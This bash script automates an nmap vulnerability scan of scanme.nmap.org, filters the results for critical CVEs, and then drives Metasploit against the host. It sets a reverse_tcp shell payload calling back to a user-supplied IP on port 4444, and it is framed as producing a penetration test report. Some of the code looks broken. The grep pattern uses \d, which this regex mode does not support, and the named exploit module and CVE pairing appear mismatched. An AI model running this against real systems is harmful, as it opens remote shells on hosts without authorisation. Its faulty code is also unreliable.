#!/bin/bash

# Define the target
TARGET="scanme.nmap.org"

# Output file for scan results
SCAN_RESULTS="nmap_scan_results.txt"

# Output file for exploitation results
EXPLOIT_RESULTS="exploitation_results.txt"

# Step 1: Perform an Nmap scan with vulnerability detection
echo "[*] Starting Nmap scan on $TARGET..."
nmap -sV --script=vulners -oN $SCAN_RESULTS $TARGET

# Check if the scan was successful
if [ $? -eq 0 ]; then
    echo "[*] Nmap scan completed successfully. Results saved to $SCAN_RESULTS."
else
    echo "[!] Nmap scan failed. Please check your command and try again."
    exit 1
fi

# Step 2: Parse the results for critical vulnerabilities
echo "[*] Analyzing scan results for critical vulnerabilities..."
CRITICAL_VULNS=$(grep -E "CVE-\d{4}-\d{4}.*(9\.8|10\.0)" $SCAN_RESULTS)

if [ -z "$CRITICAL_VULNS" ]; then
    echo "[*] No critical vulnerabilities found."
    exit 0
else
    echo "[!] Critical vulnerabilities detected:"
    echo "$CRITICAL_VULNS"
fi

# Step 3: Automate exploitation using Metasploit
echo "[*] Starting Metasploit Framework for exploitation..."

# Initialize Metasploit and run exploits
{
    # Example: Exploit OpenSSH (CVE-2023-38408)
    echo "use exploit/linux/ssh/openssh_auth"
    echo "set RHOSTS $TARGET"
    echo "set PAYLOAD linux/x86/shell/reverse_tcp"
    echo "set LHOST <YOUR_IP>"  # Replace with your IP
    echo "set LPORT 4444"       # Replace with your desired port
    echo "run"
    echo "exit"
} | msfconsole -q -o $EXPLOIT_RESULTS

# Check if exploitation was successful
if grep -q "Session created" $EXPLOIT_RESULTS; then
    echo "[!] Exploitation successful. Check $EXPLOIT_RESULTS for details."
else
    echo "[*] No successful exploitation attempts."
fi

# Step 4: Generate a final report
REPORT_FILE="penetration_test_report.txt"
echo "[*] Generating penetration test report..."
{
    echo "Penetration Test Report for $TARGET"
    echo "==================================="
    echo "Critical Vulnerabilities Identified:"
    echo "$CRITICAL_VULNS"
    echo ""
    echo "Exploitation Results:"
    cat $EXPLOIT_RESULTS
} > $REPORT_FILE

echo "[*] Report saved to $REPORT_FILE."